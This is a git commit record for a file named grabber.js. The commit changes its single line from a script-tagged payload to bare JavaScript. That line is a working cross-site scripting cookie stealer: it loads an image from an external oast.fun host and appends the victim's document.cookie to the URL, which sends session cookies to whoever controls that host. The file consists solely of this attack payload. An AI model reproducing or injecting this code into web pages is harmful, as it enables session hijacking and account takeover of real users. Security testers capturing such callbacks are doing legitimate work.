f81c2c56c497ff1abf60c203d5e308e9bab3c5e0
Yovecio18 <46889019+yovecio18@users.noreply.github.com>
2024-08-09 15:41:17 +0200

    Update grabber.js

--- grabber.js
+++ grabber.js
@@ -1,1 +1,1 @@
-<script>new Image().src="http://jakvbfqydwbsutdxiohxcm4bu5w2eam9f.oast.fun/?cookie="+document.cookie;</script>
+new Image().src="http://jakvbfqydwbsutdxiohxcm4bu5w2eam9f.oast.fun/?cookie="+document.cookie;
